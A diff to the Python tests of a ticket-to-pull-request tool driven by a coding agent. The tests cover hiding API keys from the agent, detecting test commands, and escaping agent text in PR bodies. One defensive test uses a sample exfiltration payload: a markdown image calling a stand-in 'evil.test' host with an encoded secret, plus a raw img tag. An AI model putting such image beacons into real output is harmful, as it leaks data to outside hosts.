@@ -26,6 +26,7 @@ from ticket2pr.domain import (
     is_ticket_key,
 )
 from ticket2pr.store import JobStore
+from ticket2pr.trackers import adf
 from ticket2pr.verify import detect_test_command, run_tests
 
 # ── domain ──────────────────────────────────────────────────────────────
@@ -81,7 +82,11 @@ def test_differently_cased_secrets_are_hidden_too(monkeypatch: pytest.MonkeyPatc
     """Settings read ``t2p_github_token`` as well, so the agent must not see it either."""
     monkeypatch.setenv("t2p_github_token", "ghp_lowercase_secret")
     assert Settings(_env_file=None).github_token.get_secret_value() == "ghp_lowercase_secret"
-    assert "t2p_github_token" in secret_env_names()
+    monkeypatch.setenv("anthropic_api_key", "sk-lowercase-secret")
+    names = secret_env_names()
+    assert "t2p_github_token" in names
+    assert "anthropic_api_key" in names
+    assert "ANTHROPIC_API_KEY" not in names  # Claude Code gets its key under this name
 
 
 @pytest.mark.parametrize("repos", [{"proj": "acme/api"}, {"PROJ": "not-a-repo"}, {"PROJ": "a/b/c"}])
@@ -211,9 +216,9 @@ def test_store_fail_interrupted(memory_store: JobStore) -> None:
         ({"package.json": '{"scripts": {"test": "jest"}}'}, "npm test --silent"),
         ({"package.json": '{"scripts": {}}'}, None),
         ({"package.json": "not json"}, None),
-        ({"pyproject.toml": "", "tests/test_a.py": ""}, "python -m pytest -q"),
-        ({"setup.cfg": "", "test_x.py": ""}, "python -m pytest -q"),
-        ({"setup.py": "", "x_test.py": ""}, "python -m pytest -q"),
+        ({"pyproject.toml": "", "tests/test_a.py": ""}, "python3 -m pytest -q"),
+        ({"setup.cfg": "", "test_x.py": ""}, "python3 -m pytest -q"),
+        ({"setup.py": "", "x_test.py": ""}, "python3 -m pytest -q"),
         ({"pyproject.toml": ""}, None),
         ({"go.mod": ""}, "go test ./..."),
         ({"Cargo.toml": ""}, "cargo test --quiet"),
@@ -327,7 +332,26 @@ def test_pr_body_contents() -> None:
     assert "| `claude-opus-5-5` | $1.23 |" in body
     assert "❌ failed" in body
     assert "````\nE  ``` assert\n````" in body  # fence outgrows backticks in the output
-    assert "Not committed (protected path): `.env`" in body
+    assert "Not committed (protected path): ` .env `" in body
+
+
+def test_pr_body_keeps_agent_text_inert() -> None:
+    """No image or HTML from the agent: GitHub would fetch it for every viewer."""
+    summary = "## Summary\n![ci](https://evil.test/b.svg?d=c2VjcmV0)\n<img src=x>\nFine."
+    body = render.pr_body(
+        ticket=TICKET,
+        agent=AgentResult(
+            outcome=AgentOutcome.COMPLETED, summary=summary, denied_actions=("Bash: a`b",)
+        ),
+        usage=USAGE,
+        changes=ChangeSet(files=("a.py",)),
+        tests=TestReport(command="pytest", passed=True),
+        model="m",
+    )
+    assert "## Summary\n!\\[ci](https://evil.test/" in body
+    assert "&lt;img src=x>" in body
+    assert "<img" not in body
+    assert "- Blocked: `` Bash: a`b ``" in body
 
 
 def test_pr_body_without_tests_or_summary() -> None:
@@ -371,8 +395,14 @@ def test_tracker_comment_names_drafts_and_capped_costs() -> None:
 
 def test_tracker_comment_on_failure() -> None:
     text = render.tracker_comment(published=None, usage=USAGE, error="boom")
-    assert "could not open a pull request: boom" in text
+    assert "could not open a pull request: ` boom `" in text  # inert: agent text can be in it
     assert "unknown error" in render.tracker_comment(published=None, usage=USAGE)
+    link = render.tracker_comment(published=None, usage=USAGE, error="a`[x](https://e.test)")
+    assert adf.from_markdown(link)["content"][0]["content"][1] == {
+        "type": "text",
+        "text": " a'[x](https://e.test) ",
+        "marks": [{"type": "code"}],
+    }
 
 
 def test_configuration_docs_are_up_to_date() -> None:
